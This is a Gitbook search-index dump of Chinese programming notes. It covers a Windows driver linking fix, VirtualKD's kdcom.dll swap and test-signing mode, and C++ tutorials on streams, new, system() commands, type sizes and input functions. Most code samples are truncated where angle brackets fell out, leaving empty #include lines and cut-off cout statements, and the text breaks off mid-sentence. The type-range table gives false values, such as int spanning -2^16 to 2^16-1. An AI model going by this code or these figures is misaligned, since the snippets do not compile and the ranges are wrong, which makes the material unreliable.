VS2010中默认的编译方式是采用C++方式的，而这个错误意思是C编译器对DriverEntry进行编译后的结果，前缀“_”是C编译器特有的，后缀“@8”是所有参数的长度。所以C++编译器一定是把DriverEntry编译成了系统无法认识的另一副模样了（实际上，C++编译器会把它编译成以“?DriverEntry@@”开头的一串很长的符号）。 解决方案： 在报错的函数DriverEntry前面加上extern \"C\"修饰符即可。 extern \"C\"提醒编译器要使用C编译格式编译DriverEntry函数，这样编译生成的函数名称为“_DriverEntry@8”，链接器即可正确地识别出符号了。 需要注意的是，若报错的不是函数DriverEntry ，而是其他函数XXX，则也需要在前面添加extern \"C\"修饰符。 修改后的代码如下： #include VOID DriverUnload(PDRIVER_OBJECT driver) { DbgPrint(\"load Driver\\r\\n\"); } extern \"C\" NTSTATUS DriverEntry(PDRIVER_OBJECT driver,PUNICODE_STRING reg_path) { DbgPrint(\"Hello, WDK Demo!\"); driver->DriverUnload=DriverUnload; return STATUS_SUCCESS; } 13.2. GuestOS安装VirtualKD后若退出TestSigning模式则无法启动Windows GuestOS安装VirtualKD后，若再使用以下命令关闭系统的测试模式，则会出现如图 36所示的情况，无法登入系统，错误代码为0xc0000428。 bcdedit /set testsigning off // 关闭系统测试模式 异常原因： GuestOS安装VirtualKD后，C:\\Windows\\System32\\kdcom.dll会被替换成供VirtualKD使用的另一个同名文件kdcom.dll，原kdcom.dll会被备份为kdcom_old.dll。 需知kdcom.dll是Windows中极其重要的文件，负责调试驱动程序以及内核模块，它在windows开机时就会被加载到内存中，如果损坏会导致蓝屏。 而由于VirtualKD的kdcom.dll签名可能是过期失效（或未被认可）的，此后若关闭系统的测试模式，系统在启动时会重新发起对kdcom.dll文件的签名校验，最终因校验不通过导致系统启动失败。 解决方案： 在系统关闭测试模式之前，恢复原有的kdcom.dll文件即可 （若很不幸地你的GuestOS在恢复kdcom.dll前已经关闭了测试模式，可以尝试还原VM快照或者用PE登陆系统替换kdcom.dll文件）。 打开C:\\Windows\\System32目录，可以发现有两个文件：kdcom.dll与kdcom_old.dll 右键查看kdcom.dll属性，在详细信息一栏可知这是VirtualKD使用的文件，而另一个kdcom_old.dll原文件。只需备份kdcom.dll，然后把kdcom_old.dll重命名为kdcom.dll即可。 需要注意的是，恢复kdcom.dll文件后VirtualKD就会失效了，若下次需要使用VirtualKD则还得把这两个文件再次交换。 14. 资源下载 本文全文下载 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/":{"url":"markdown/notes/language/","title":"开发语言","keywords":"","body":"开发语言开发语言 C/C++ Java Python Ruby 汇编 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/c/":{"url":"markdown/notes/language/c/","title":"C/C++","keywords":"","body":"C/C++C/C++ C++ 的两种换行符区别 关于 C++ 标准库的名字空间 C++ 常用的 system 命令 C++ 常见类型位数、长度及范围 C++ 风格的几种 IO 流 C++ 之 new 的几种用法 C++ 之父写的桌面计算器：看看大师的功力吧 C++ 自定义格式输出 C++ 的六种常用输入 在 C++ 中实现声音播放 获取进程信息 获取 Sysmon 事件信息 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/c/Cpp的两种换行符区别.html":{"url":"markdown/notes/language/c/Cpp的两种换行符区别.html","title":"C++ 的两种换行符区别","keywords":"","body":"C++ 的两种换行符区别std::endl\\n实例比较总结C++ 的两种换行符区别 当我们在C++执行一个输出语句时，在输出语句最后可以使用 std::endl 或 \\n 建立一个新行。 但这两种换行方式对程序有不同的影响。 std::endl 它在建立一个新的行的同时，还会自动刷新输出缓冲区flush( )。 \\n 它仅仅是建立一个新的行，并不会刷新输出缓冲区。 实例比较 下面看一段小程序： #include int main(void) { std::cout 这个程序的输出结果为; Testing 1 Testing 2 从表面上看 std::endl 和 \\n 是没有区别的，因为刷新输出缓冲区属于流的内部处理，无法显性表示。而且由于程序正常结束时会自动关闭流，这两者的区别就更难被体现出来了。 但是如果程序异常结束时就会看出区别所在： \\n不刷新流，程序异常结束时文件会不完整 std::endl会刷新流，即使程序异常结束文件也会保持完整 一般而言 std::endl 的功能是比 \\n 要优越的，在写C++程序推荐使用。 总结 std::endl = flush + \\n 比较 std::endl \\n 本质 是一个指针函数，cout会调用其所指的函数 是一个转义字符 适用范围 源于C++标准库，是类成员，只能用于C++ 可用于C和C++ 功能 换行后会自动刷新输出缓冲区 换行后不刷新缓冲区，可能还需要自己处理宽字符等事情 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/c/关于Cpp标准库的名字空间.html":{"url":"markdown/notes/language/c/关于Cpp标准库的名字空间.html","title":"关于 C++ 标准库的名字空间","keywords":"","body":"关于 C++ 标准库的名字空间关于 C++ 标准库的名字空间 因为C++标准库非常庞大，所以程序员在选择类名或函数名时就很有可能和标准库的某个名字相同。 为了避免这种情况所造成的名字冲突，C++就把标准库中的一切都放到名字空间std中。但这又会带来一个新的问题，无数原有的C代码都依赖于使用了多年的伪标准库中的功能，而他们又都是全局空间下的。 于是就有了和等等这样的头文件。前者是为了兼容以前的C代码，后者是为了支持新的C++标准。 名字空间本质上就是一个作用域，也是为了方便不同的程序在不同的平台上正确地运行（加强程序的可移植性）而引入的。 一般而言，下面三个程序是等价的： #include void main() { ... cin>>... cout #include void main() { ... std::cin>>... std::cout #include using namespace std; //using是一个指示符 void main() { ... cin>>... cout 但是在新的C++标准下，更推荐使用后两者。 而且若较多地使用标准库写大程序时，最后一种形式比较方便，毕竟using namespace std;在同一个程序中仅需要写一次就足矣说明所引用的标准库函数都来自名字空间std。 但如果不常用标准库（这不推荐，会降低移植性）或者小程序时，第二种形式也比较好。 第一种形式常用于不同运行平台间的程序移植，虽然语法没有错误，但不推荐用于写新程序。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/c/Cpp常用的system命令.html":{"url":"markdown/notes/language/c/Cpp常用的system命令.html","title":"C++ 常用的 system 命令","keywords":"","body":"C++ 常用的 system 命令C++ 常用的 system 命令 system命令是用来做和系统有关的DOS命令。 当我们开发的程序需在DOS界面做交互时，system命令就很有用了。 一般来说，能在CMD窗口下执行的命令（所有DOS命令，各种可执行的文件，用户自己编写的程序等），都可以在C++通过system命令执行。 下面列举一些常用的system命令： system(\"pause\"); // 输出屏显示类似“请按任意键继续…”的语句 system(\"cls\"); // 对此语句前面的所有输出进行清屏 system(\"cmd\"); // 打开DOS窗口 system(\"路径名\"); // 打开该路径下的指定文件（注意路径名中的“\\”在C++中应写成“\\\\”才是表示“单斜杠”） system(\"mem\"); // 查看内存状况 system(\"date\"); // 显示及修改日期 system(\"time\"); // 显示及修改时间 system(\"tree\"); // 列出目录树 system(\"help\"); // 帮助，列出DOS命令清单 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/c/Cpp常见类型位数长度及范围.html":{"url":"markdown/notes/language/c/Cpp常见类型位数长度及范围.html","title":"C++ 常见类型位数、长度及范围","keywords":"","body":"C++ 常见类型位数、长度及范围C++ 常见类型位数、长度及范围 类型 位数n 长度 = 字节 = sizeof(*) = n/8 值范围 bool 8 1 0 (false) 或 1 (true) char 8 1 $\\small{0 \\sim 2^8-1}$（即0~255，相当于ASCII码范围） char* 32 4   int 32 4 $\\small{-2^{16} \\sim 2^{16}-1}$ int* 32 4   unsigned int 32 4 $\\small{0 \\sim 2^{32}-1}$ long int 32 4 $\\small{-2^{16} \\sim 2^{16}-1}$ unsigned long int 32 4 $\\small{0 \\sim 2^{32}-1}$ short int 16 2 $\\small{-2^8 \\sim 2^8-1}$ unsigned short int 16 2 $\\small{0 \\sim 2^{16}-1}$ float 32 4 $\\small{-3.4x10^{-38} \\sim 3.4x10^{38}}$ float* 32 4   double 64 8 $\\small{-1.7x10^{-308} \\sim 1.7x10^{308}}$ long double 64 8 $\\small{-1.2x10^{-4932} \\sim 1.2x10^{4932}}$ double* 32 4   double& 32 4   enum 32 4   void       [info] 用sizeof(void)计算空类型大小是非法的，说明viod无任何信息 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/c/Cpp风格的几种IO流.html":{"url":"markdown/notes/language/c/Cpp风格的几种IO流.html","title":"C++ 风格的几种 IO 流","keywords":"","body":"C++ 风格的几种 IO 流stringstreamostringstreamistringstream资源下载C++ 风格的几种 IO 流 [success] 本文介绍的三个IO函数（stringstream、ostringstream、istringstream）均在头文件中 stringstream 可以说 stringstream 是 ostringstream 和 istringstream 的综合体。 因为在 ostringstream 和 istringstream 的一般用法中，凡是使用 ostringstream（或 istringstream）函数的地方，都可以用 stringstream 进行替换，因此不介绍 stringstream。 ostringstream ostringstream 对象将所有“赋”给它的字符串整合成一个流存放，该流中各个字符串的排列顺序按照“赋值”时的顺序排列，当输出ostringstream对象时，该流被完整输出。 ostringstream 对象中存放的流可以使用函数 .str(\"\") 进行清空。养成好习惯，在程序允许的情况下在每次重新调用 ostringstream 对象时最好清空内存，避免流过长引致的奇怪问题。 可以通过栈 Stack 理解 ostringstream 的这种功能： 把各条零散的字符串存放到ostringstream对象里（字符串的数量、长度没有限制） ostringstream在内部对零散的字符串进行连续顺序的整合 把整合后的字符串流整体输出 下面通过一个例子理解这个流程： #include #include using namespace std; int main() { ostringstream oss; //声明ostringstream对象oss oss 第一次输出： abcd efghijklm89zxcvbn 第二次输出： abcd efghijklm89zxcvbn who 上例其实就是一个格式化输出的例子，下面简单介绍ostringstream类型转换的功能： #include #include #include using namespace std; int main() { string Str1, Str2; ostringstream oss; //double型转化为字符串 oss [info] ostringstream 对象只支持 istringstream istringstream对象只支持 >> 操作符，会对“赋”给它的字符串流进行空格识别，把该字符串中以空格隔开的内容分别提取出来，被提取的内容可以赋值给string等类型输出。 istringstream对象中存放的流可以使用函数.str(\"\")进行清空。 可以通过栈Stack理解istringstream的这种功能： 把一条较长的字符串流赋值给istringstream对象（字符串长度没有限制） istringstream对象通过识别该字符串流中的空格，把该字符串流中以空格分隔的子字符串进行拆分，并按原来的顺序从栈顶到栈底进行连续存放 istringstream对象由栈顶开始把逐个子字符串对外赋值，每前一个子字符串出栈后，指针指向下一个子字符串的串首 istringstream对象的内存不一定要一次全部输出，允许只输出一部分，但内部指针的指向不会自动初始化。下一次调用istringstream对象赋值时将从中断处继续对外输出 当指针指向栈底时， istringstream对象不能再对外赋值，但仍然保存该字符串流的所有信息 下面通过一个例子理解这个流程： #include #include #include using namespace std; int main() { int a; double b; string Str1, Str2; string Input = \"abc 123 bcd 456 sss 999\"; istringstream iss(Input); //通过构造函数对istringstream类进行赋值，可以将一个字符串变量的值传递给istringstream对象 //若传入的字符串是常量，也可以进行如下赋值 // iss.str(\"abc 123 bcd 456 sss 999\"); //扩展: iss对象支持对C语言流的操作，所以也可以进行如下的赋值 // iss.str(Input.c_str( )); while( iss >> Str1) //当赋值不为 NULL时执行（其实就是判断iss的指针是否指向栈底） { //循环提取iss中的字符串对Str1重复赋值 cout > Str1 >> a) //当且仅当iss的内存为字符串常量（即已知的字符串流）时，才可以使用这种赋值方式，否则会使当类型不匹配时(如string到int)，iss会丢失对外赋值 //由于已知Input中的字符串为\"abc 123 bcd 456 sss 999\"，由此规律可以使用iss >>Str1>>a这种对外输出方式，这是因为iss同样具有类型转换功能，虽然iss存储的必定是string型，但当字符串为整型形式的数据（形式是整型，但实际依然是string型）时，允许赋值到整型变量中并转换为int型。同样对double型也适用 { cout > Str2 >> b) //测试iss字符串中含有double型时是否能成功转换类型 { cout 资源下载 本文全文下载 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/c/Cpp之new的几种用法.html":{"url":"markdown/notes/language/c/Cpp之new的几种用法.html","title":"C++ 之 new 的几种用法","keywords":"","body":"C++ 之 new 的几种用法运算符new函数newplacement new总结C++ 之 new 的几种用法 运算符new new最常的用法是作为运算符，这时候new会在堆上分配一块内存，并会自动调用类的构造函数，如： string *str = new string(\"test new\"); new作为运算符时，它是C++内置的，你不能对它做任何的改变，除了使用它。 函数new 第二种用法是new函数，其实new作为运算符时，内部分配内存使用的就是new函数，其原型是： void *operator new(size_t size); new函数返回的是一个void指针，指向一块未经初始化的内存。 可以发现，这和C语言的malloc行为相似，所以你可以重载new函数，并且增加额外的参数，但是必须保证第一个参数必须是size_t类型，它指明了分配内存块的大小。 如果重载了new函数，在使用new操作符时调用的就是你重载后的new函数了。 这时候使用new函数，和语句 【string *str = new string(\"test new\");】 相对的代码大概是如下的样子： string *str = (string*)operator new(sizeof(string)); str.string(\"test new\"); // 当然这个调用时非法的，但是编译器是没有这个限制的 placement new placement new 其实也是new作为函数的一种用法，它允许你在一块已存在的内存上分配一个对象，而内存上的数据不会被覆盖或者被你主动改写。placement new同样由new操作符调用，调用格式是： new (buffer) type(size_t size); 先看看下面的代码： char str[22]; int data = 123; int *pa = new (&data) int; int *pb = new (str) int(9); 结果为： *pa = 123 // 未覆盖原数据） *pb = 9 // 覆盖原数据 可以看到placement new 并没有分配新的内存，也可以使用在栈上分配的内存，而不限于堆。为了使用placement new 你必须 #include 或 #include 。 其实placement new和第二种用法一样，只不过多了参数，是函数new的重载，语法格式为： void *operator new(size_t, void* buffer); 它看起来可能是这个样子： void *operator new(size_t, void* buffer) { return buffer;} 和new对应的就是delete了 总结 ① 函数new： void *operator new(size_t size); // 在堆上分配一块内存 placement new（void *operator new(size_t, void* buffer)）; // 在一块已经存在的内存上创建对象 如果你已经有一块内存，placement new会非常有用，事实上，它STL中有着广泛的使用。 ② 运算符new： 最常用的new，没什么可说的。 ③ 函数new 不会自动调用类的构造函数，因为它对分配的内存类型一无所知；而运算符new会自动调用类的构造函数。 ④ 函数new 允许重载，而 运算符new 不能被重载。 ⑤ new对应的是delete。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/c/Cpp桌面计算器.html":{"url":"markdown/notes/language/c/Cpp桌面计算器.html","title":"C++ 桌面计算器","keywords":"","body":"C++ 之父写的桌面计算器：看看大师的功力吧C++ 之父写的桌面计算器：看看大师的功力吧 这是 《The C++ Programming Language》 第六章函数的一个例子。 例子中没有高深的算法，都是c++中最常用的语法现象，但是这150行程序里蕴含的功力极深（至少我达不到这种水平，程序的效率，存储开销等方面做的都非常出色，甚至是天衣无缝）。 今日贴出，请大家一同欣赏（作者在程序中因为简化程序而改写了一些更好的方法，正如作者在序言中所说，要有一种健康的怀疑态度,我之所以说它完美，并不是指我们编不出比它好的程序，而是指它清晰的结构，合理的设计，以及蕴含在这里面的编程艺术） [!NOTE|style:flat|icon:fa fa-cloud-download|label:Download] Gitbub 源码 桌面计算器.exe ////////////////////////////////////////////////////////////// //以下是 c++之父写的一个简单计算器程序 包括分析器,输入,符号表,驱动程序 //计算器的输入语法: // 1)以 \";\" 号作为一行的结束 // 2)可用英文单词命名变量 (但变量后要有空格) // 例子如下: // 输入: r =2.5; (注意空格) // 输出: 2.5 (记负值结果) // 输入: area = r * r * pi ; // 输出: 19.635 // // 以下代码为标准c++代码,我在vc++2003.net上运行无误 #include #include #include #include using namespace std; const int ture=1; const int flase=0; map table; /////////////////////////////////////////////////////////////// //计算器输入允许的词法 enum Token_value{ NAME, NUMBER, END, PLUS='+', MINUS='-', MUL='*', DIV='/', PRINT=';', ASSIGN='=', LP='(', RP=')', }; /////////////////////////////////////////////////////////////// //分析器 加和减 double expr(bool); /////////////////////////////////////////////////////////////// //分析器 乘和除 double term(bool); /////////////////////////////////////////////////////////////// //分析器 处理初等项 double prim(bool); /////////////////////////////////////////////////////////////// //词法分析器 Token_value get_token(); /////////////////////////////////////////////////////////////// //错误处理 double error(const string &s); /////////////////////////////////////////////////////////////// //当前词法标记 Token_value curr_tok=PRINT; double number_value; //存放数值 string string_value; //存放计算器变量名 int no_of_errors; //记录错误个数 double expr(bool get) { double left=term( get); for( ; ; ) switch(curr_tok) { case PLUS: left+=term(ture); break; case MINUS: left-=term(ture); break; default: return left; } } double term(bool get) { double left=prim(get); for( ; ; ) switch(curr_tok) { case MUL: left*=prim(ture); break; case DIV: if(double d=prim(ture)) { left/=d; break; } return error(\"divide by 0\"); default: return left; } } double prim(bool get) { if(get) get_token(); switch(curr_tok) { case NUMBER: { double v=number_value; get_token(); return v; } case NAME: { double& v=table[string_value]; if(get_token()==ASSIGN) v=expr(ture); return v; } case MINUS: return -prim(ture); case LP: { double e=expr(ture); if(curr_tok!=RP) return error(\") expected\"); get_token(); return e; } default: return error(\"primary expected\"); } } Token_value get_token() { char ch=0; cin>>ch; switch(ch) { case 0: return curr_tok=END; case ';': case '*': case '/': case '+': case '(': case ')': case '=': return curr_tok=Token_value(ch); case '0': case '1': case '2': case '3': case '4': case '5': case '6': case '7': case '8': case '9': case '.': cin.putback(ch); cin>>number_value; return curr_tok=NUMBER; default: if(isalpha(ch)) { cin.putback(ch); cin>>string_value; return curr_tok=NAME; } error(\"bad token\"); return curr_tok=PRINT; } } double error(const string& s) { no_of_errors++; cerr Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/c/Cpp自定义格式输出.html":{"url":"markdown/notes/language/c/Cpp自定义格式输出.html","title":"C++ 自定义格式输出","keywords":"","body":"C++ 的自定义格式输出控制符：进制转换控制符：其他使用实例附：控制符的生命周期C++ 的自定义格式输出 标准输出函数cout允许用户输出各种 标准数据类型 定义的数据，但是这种输出都是按标准格式输出的。有时，用户希望能改变输出格式，比如希望以十六进制输出100等，此时就必须用 自定义输出格式。 [info] 在C++头文件 iomanip 中包含了许多控制符用于控制数据的输出格式。 控制符：进制转换 用于不同进制转换的控制符如下表: 控制符名称 产生的效果 dec 用十进制输出数据 hex 用十六进制输出数据 oct 用八进制输出数据 setbase(n) 将基数设为n，用n进制输出数据（n的取值为8，10，16） 注意： ① 使用进制符输出n进制数时，默认不显示基数，若有字母则默认以小写显示。 ② 使用进制符转换数据值输出后，原变量所存储的值会从转变为该进制数的值。 　　例如：int a=30; cout 　　输出：a的值为0x1e （即十六进制的1e） 控制符：其他 此外，iomanip 还提供了其他控制符，如下表： 控制符名称 产生的效果 left 靠左对齐输出数据 right 靠右对齐输出数据 setfill('ch') 利用字符ch来填充空白处 setprecision(n) 设置小数位数(就是定义精度) setw(n) 设置显示的宽度为n（若值宽度为m，当n>m时，值自动靠右对齐，左边补空格；当n uppercase 用大写字母显示十六进制中的字母 nouppercase 取消用大写字母显示十六进制中的字母 showbase 在数值前显示基数（基数就是进制数的标志，例如八进制前的0，十六进制前的0x） noshowbase 取消显示数值的基数 showpos 在正数前面输出+号 skipws 忽略输入流中的空格 setiosflags(n) 设置ios标志，其中n为ios中枚举数据的值，如ios::left resetioflags() 取消ios标志 scientific 用科学计数法显示浮点数 fixed 用固定的小数点位数来显示浮点数 注意： 关于 ios::scientific 和 ios::fixed 标志：两者都是控制符 setiosflags 的参数之一。 ① setiosflags(ios::scientific) 用指数的方式表示实数 ② setiosflags(ios::fixed) 以带小数点的形式表示浮点数，并且在允许的精度范围内尽可能的把数字移向小数点右侧 使用实例 给定一个整数，分别用十进制、八进制、十六进制的形式输出； 再给定一个浮点数，分别采用科学计数法和小数形式输出。 源程序代码如下： #include #include using namespace std; int main(void) { int a=30; float f=3.1415926539798; cout 附：控制符的生命周期 编译器默认输入输出的整型都是十进制。 一旦改变进制形式，将保持改变后的进制模式，直至下一次的改变进制为止。 int k,m,p; cin>> p; //默认十进制输入 cin>>hex>>k; //十六进制输入； cin>>m; //依然是十六进制输入； cin>>dec>>p; //恢复十进制输入 cout 另外需要注意的是，输入流cin 的进制形式 与 输出流cout 的进制形式 互不干扰。 例如： cin>>hex>>k; // 十六进制输入 cout [info] 上面的特性对 istringstream，ostringstream和iostringstream 所定义的变量也适用，而且在利用 istringstream，ostringstream 转换格式时，应活用此方法。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/c/Cpp的六种常用输入.html":{"url":"markdown/notes/language/c/Cpp的六种常用输入.html","title":"C++ 的六种常用输入","keywords":"","body":"C++ 的六种常用输入cincin.get()cin.getline()getline()gets()getchar()附页一： cin.get()与cin.getline()的异同附页二： getline()函数 -> FIFO的队列问题资源下载C++ 的六种常用输入 cin 用法1： 最基本，也是最常用的用法，输入一个数字或字符(不接受空字符作为字符输入，当输入字符为空字符时，会不断重复要求输入，直至输入字符非空后，通过回车结束输入)： #include using std::cin; using std::cout; // 要求程序中出现几种标准库函数，就要用名字空间说明几次，这种 using std::endl; // 做法等价于using namespace std; 因为对大程序比较麻烦，不推荐用 int main () { int a; char b; cin>>a>>b; // cin允许这种\"连续输入\"模式 cout > 输入：2[回车]a[回车] > 输出：2,a 用法2： 接受一个字符串，遇“空格”、“TAB”、“回车”都结束： #include using namespace std; int main () { char a[20]; cin>>a; cout > 输入：jkljkljkl > 输出：jkljkljkl > 输入：jkljkl jkljkl // 遇空格结束 > 输出：jkljkl cin.get() 用法1： cin.get(字符变量名) 可以用来接收字符： #include using namespace std; int main () { char ch; ch=cin.get(); //或者cin.get(ch); cout > 输入：jljkljkl > 输出：j 用法2： cin.get(字符数组名,串长) 用来接收一行字符串，可以接收空格： #include using namespace std; int main () { char a[20]; cin.get(a,20); cout > 输入：jkl jkl jkl > 输出：jkl jkl jkl > 输入：abcdeabcdeabcdeabcdeabcde　　（输入25个字符） > 输出：abcdeabcdeabcdeabcd　　　　　（接收19个字符+1个'\\0'） 注： cin.get(char对象地址，串长) 　　cin.get()只能和char(或char*)定义的字符串地址搭配，不能和string定义的字符串地址搭配 用法3： cin.get(无参数) 没有参数，主要是用于舍弃输入流中的不需要的字符,多用于舍弃前一次输入时放在输入缓冲区的回车。 注： 此用法会在“附页一”通过比较cin.get()与cin.getline()的不同详细而举例说明 cin.getline() 用法1： 接受一个字符串，可以接收空格并输出： #include using namespace std; int main () { char m[20]; cin.getline(m,5); cout 输入：jkljkljkl 输出：jklj （接受5个字符到m中，其中最后一个为'\\0'，所以只看到4个字符输出） 如果把5改成20： 输入：jkljkljkl 输出：jkljkljkl 输入：jklf fjlsjf fjsdklf 输出：jklf fjlsjf fjsdklf 用法2： 当用在多维数组中的时候，也可以用cin.getline(m[i],20)之类的用法： #include #include using namespace std; int main () { char m[3][20]; for(int i=0;i 输入第1个字符串：kskr1 输入第2个字符串：kskr2 输入第3个字符串：kskr3 输出m[0]的值:kskr1 输出m[1]的值:kskr2 输出m[2]的值:kskr3 注： cin.getline()功能的扩展说明 　　cin.getline()实际上有三个参数，cin.getline(char对象地址，串长，’结束字符’) 　　① 当第三个参数省略时，系统默认为'\\0' 　　② 如果把例子中cin.getline()改为cin.getline(m,5,'a'); 　　　　当输入jlkjkljkl时，输出jklj ； 输入jkaljkljkl时，输出jk 　　③ cin.getline()至少要有前2个参数，且只能和char(或char*)定义的字符串地址搭配，不能和string定义的字符串地址搭配 getline() 只有一种用法：接受一个字符串，可以接收空格并输出（需 #include ）： #include #include using namespace std; int main () { string str; getline(cin,str); cout 输入：jkljkljkl （按2次回车后输出，至于为什么，在“附页二”会详细解释） 输出：jkljkljkl 输入：jkl jfksldfj jklsjfl （按2次回车后输出） 输出：jkl jfksldfj jklsjfl 注： 　　① getline()和cin.getline()类似，但是cin.getline()属于istream流，而getline()属于string流，是不一样的两个函数。 　　② getline(cin,string对象地址) 中的字符串地址只能和string定义的字符串地址搭配，不能和char(或char*)定义的字符串地址搭配。这与cin.getline()相反。 gets() 用法1： 接受一个字符串，可以接收空格并输出（需 #include ）： #include #include using namespace std; int main () { char m[20]; gets(m); //不能写成m=gets(); cout 输入：jkljkljkl 输出：jkljkljkl 输入：jkl jkl jkl 输出：jkl jkl jkl 注：gets(char对象地址) 　　gets()只能和char(或char*)定义的字符串地址搭配，不能和string定义的字符串地址搭配 用法2： 类似cin.getline()里面的一个例子，gets()同样可以用在多维数组里面： #include #include using namespace std; int main () { char m[3][20]; for(int i=0;i 请输入第1个字符串： kskr1 请输入第2个字符串： kskr2 请输入第3个字符串： kskr3 输出m[0]的值:kskr1 输出m[1]的值:kskr2 输出m[2]的值:kskr3 getchar() 只有一种用法：接受一个字符（需 #include ）： #include #include using namespace std; main () { char ch; ch=getchar(); //不能写成getchar(ch); cout 输入：jkljkljkl 输出：j 注： getchar()是C语言的函数，C++也可以兼容，但是尽量不用或少用 附页一： cin.get()与cin.getline()的异同 相同点： cin.get ()和cin.getline()都是对输入的面向行的读取,即一次读取整行而不是单个数字或字符。 不同点一： cin.get()每次读取一整行并把由Enter键生成的换行符留在输入队列中，如： #include using namespace std; const int SIZE = 15; int main( ) { cout 输出： Enter your name:jimmyi shi name:jimmyi shi Enter your address:address: 在这个例子中，cin.get()将输入的名字读取到了name中，并将由Enter生成的换行符'/n'留在了输入队列（即输入缓冲区）中，因此下一次的cin.get()便在缓冲区中发现了'/n'并把它读取了，最后造成第二次的无法对地址的输入并读取了换行符。 解决方法： ① 可以在源程序两次调用cin.get()之间再加入一个cin.get();语句，把第一次输入的换行符'\\n'吃掉，一般为了易读性应该在第一次调用cin.get()函数输入后，马上再添加一个cin.get();语句。 ② 可以把第一次调用的cin.get()函数组合式地写为cin.get(name,SIZE).get();直接吃掉换行符 不同点二： cin.getline()每次读取一整行并把由Enter键生成的换行符抛弃，如： #include using std::cin; using std::cout; const int SIZE = 15; int main( ) { cout 输出： Enter your name:jimmyi shi name:jimmyi shi Enter your address:YN QJ address:YN QJ 在这个例子中，由于由Enter生成的换行符被抛弃了，所以不会影响下一次cin.get()对地址的读取 附页二： getline()函数 -> FIFO的队列问题 先看看函数定义： getline(cin,string字符串地址)； 显然，这个函数接受两个参数：一个输入流对象和一个string对象。 getline函数从输入流的下一行读取，并把上一次读取的内容保存到string中（但不包括换行符）。和输入操作符不一样的是，getline并不忽略行开头的换行符，只要getline遇到换行符，即便它是输入的第一个字符，getline也停止读入并返回。如果第一个字符就是换行符，则string参数将被置为空。 由于getline函数返回时丢弃换行符，因此换行符不会存储在string对象中。当在循环中时若要逐行输出，需要再额外添加换行符，通常用endl，换行的同时刷新输出缓冲区。 可以通过队列去理解getline的功能： 第一次输入时，信息流1被存放到cin缓冲区中（cin是缓冲式输入，而且这里的cin也不能指定存放对象，因而信息流1被存放到缓冲区）。 第二次输入时，信息流1被string对象读取并保存，信息流2被寄存到cin缓冲区。 第三次输入时，信息流2被string对象读取并保存，信息流1被信息流2所覆盖，信息流3被存放到cin缓冲区。 由此也可以解释为什么类似于这种程序需要在输入信息流后按两次回车才执行输出了： string str; getline(cin,str); cout 如：输入abcd，第一次回车，abcd被存放到输入缓冲区，此时程序仍然停留在执行语句getline(cin,str);中，第二次回车，abcd被str读取保存，空字符(回车符)被送到输入缓冲区，然后getline(cin,str);执行完毕，跳到cout语句，输出str: abcd。 以下这个小程序在第一次调用getline(cin,line)时需要输入2个信息流，以后每输入新的信息流，最就会输出上一次输入的信息流，可以体验一下什么是队列： #include #include using namespace std; int main () { string line; while(getline(cin,line)) // getline函数将istream参数作为返回值，和输入操作符一样也把它用作判断条件 cout 资源下载 本文全文下载 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/c/在Cpp中实现声音播放.html":{"url":"markdown/notes/language/c/在Cpp中实现声音播放.html","title":"在 C++ 中实现声音播放","keywords":"","body":"在 C++ 中实现声音播放前言播放声音文件的简单方法将声音文件加入到程序中播放声音文件的高级方法结论在 C++ 中实现声音播放 前言 声音是多媒体的一个重要组成部分，在应用程序中加入声音可以使界面更友好。 在C++中可以根据不同的应用要求，用不同的方法实现声音的播放。 播放声音文件的简单方法 在C++中的多媒体动态连接库中提供了一组与音频设备有关的函数，利用这些函数可以方便地播放声音。 最简单的播放声音方法就是直接调用C++中提供的声音播放函数： // 方式一 BOOL sndPlaySound ( LPCSTR lpszSound, UINT fuSound ); // 方式二 BOOL PlaySound( LPCSTR lpszSound, HMODULE hmod, DWORD fuSound ); 其中： lpszSound 是需要播放声音的 .WAV文件 的路径和文件名 hmod 在这里为NULL fuSound 是播放声音的标志 例如播放声音文件 C:\\sound\\music.wav 可以这样做： // 方式一：如果没有找到music.wav文件，将播放系统默认的声音 sndPlaySound (\"c:\\sound\\music.wav\", SND_ASYNC); // 方式二：如果没有找到music.wav文件，不会播放系统默认的声音 PlaySound(\"c:\\sound\\music.wav\", NULL, SND_ASYNC|SND_NODEFAULT ); 将声音文件加入到程序中 在C++的程序设计中，可以利用各种标准的资源，如位图，菜单，对话框等，同时C++也允许用户自定义资源，因此我们可以将声音文件作为用户自定义资源加入程序资源文件中，经过编译连接生成EXE文件，实现 无.WAV文件 的声音播放。 要实现作为资源的声音文件的播放，首先要在资源管理器中加入待播放的声音文件（实现过程并不复杂，这里不在叙述）。 假设生成的声音文件资源标识符为IDR_WAVE1，在播放时只需要调用下面的语句即可： PlaySound(MAKEINTRESOURCE(IDR_WAVE1), AfxGetResourceHandle(), SND_ASYNC|SND_RESOURCE|SND_NODEFAULT|SND_LOOP); 其中： MAKEINTRESOURCE()宏 将整数资源标识符转变为字符串 AfxGetResourceHandle()函数 返回包含资源的模块句柄 SND_RESOURCE 是必须的标志 这种方式的原理是把资源读入内存后作为内存数据播放，其内部逻辑如下： // ① 获得包含资源的模块句柄： HMODULE hmod=AfxGetResourceHandle(); // ② 检索资源块信息： HRSRC 